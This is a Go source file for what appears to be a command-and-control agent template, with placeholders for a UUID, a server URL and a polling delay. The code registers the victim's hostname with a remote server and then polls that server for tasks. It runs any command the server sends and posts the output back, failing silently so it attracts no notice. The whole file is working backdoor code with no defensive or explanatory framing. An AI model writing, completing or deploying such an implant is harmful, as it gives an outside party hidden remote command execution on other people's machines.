package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

type BindData struct {
	UUID     string `json:"uuid"`
	Hostname string `json:"hostname"`
}

type StdReqData struct {
	UUID     string `json:"uuid"`
}

type Task struct {
	ID      int      `json:"id"`
	File    string   `json:"file"`
	Args    []string `json:"args"`
	Verbose bool     `json:"verbose"`
}

type ReplyData struct {
	UUID    string `json:"uuid"`
	TaskID  int    `json:"task_id"`
	Content string `json:"content"`
}

func doPost(url string, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("POST request failed with status: %s", resp.Status)
	}

	return nil
}

func doGet(url string, data interface{}) (string, error) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("GET", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println("Failed to send request:", err)
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("Failed to send request:", err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func executeCommand(file string, args []string) (string, error) {
	out, err := exec.Command(file, args...).Output()
	return string(out), err
}

func main() {
	uuid := "@UUID@"
	hostname, err := os.Hostname()
	if err != nil {
		os.Exit(0)
	}

	baseUrl := "@URL@"

	postData := BindData{
		UUID:     uuid,
		Hostname: hostname,
	}

	// Perform the POST request
	for {
		err := doPost(baseUrl+"/bind", postData)
		if err == nil {
			break
		}
		time.Sleep(2 * time.Second)
	}

	for {
		time.Sleep(@DELAY@ * time.Second)

		// Perform the GET request
		stdReqData := StdReqData{UUID: uuid}
		resp, err := doGet(baseUrl+"/task", stdReqData)
		if err != nil {
			// fmt.Println("Failed to perform GET request:", err)
			continue
		}

		// Check if task is not "NONE"
		if resp != "NONE" {
			var nextTask Task
			err = json.Unmarshal([]byte(resp), &nextTask)
			if err != nil {
				return
			}

			// Execute the shell command
			replyData := ReplyData{
				UUID:    uuid,
				TaskID:  nextTask.ID,
				Content: "",
			}

			out, err := executeCommand(nextTask.File, nextTask.Args)
			if err != nil {
				// fmt.Println("Failed to execute shell command:", err)
				replyData.Content = "Execution Error!\n\n" + out
			} else {
				// Prepare the response data
				replyData.Content = out
			}

			// Perform the POST request to return the result
			err = doPost(baseUrl+"/reply", replyData)
			if err != nil {
				// fmt.Println("Failed to perform POST request:", err)
				continue
			}
		}
	}
}